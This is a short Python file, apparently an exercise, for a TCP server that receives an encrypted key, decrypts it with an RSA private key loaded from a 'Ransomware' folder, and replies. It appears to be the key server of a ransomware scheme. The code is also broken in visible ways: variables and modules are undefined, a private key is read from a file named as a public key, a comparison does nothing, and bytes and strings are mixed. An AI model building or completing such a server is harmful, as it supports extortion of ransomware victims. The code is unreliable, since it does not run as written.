from email import message
import socketserver

class ClientHandler(socketserver.BaseRequestHandler):

    def handle(self):
        encrypted_key = self.request.recv(1024).strip()
        print ("Implement decryption of data " + encrypted_key )
        #------------------------------------
        #      Decryption Code Here 
        #------------------------------------

        from cryptography.hazmat.primitives import serialization
        with open("home/prof/Desktop/Ransomware/public_key.key", "rb") as key_file:
            private_key = serialization.load_pem_private_key(
                key_file.read(),
                password=None,
            )   

        plaintext = private_key.decrypt(
            ciphertext,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                label=None
            )
        )
        plaintext == message
        True
        

        self.request.sendall("send key back")
if __name__ == "__main__":
    HOST, PORT = "", 8000

    tcpServer =  socketserver.TCPServer((HOST, PORT), ClientHandler)
    try:
       tcpServer.serve_forever()
    except:
        print("There was an error")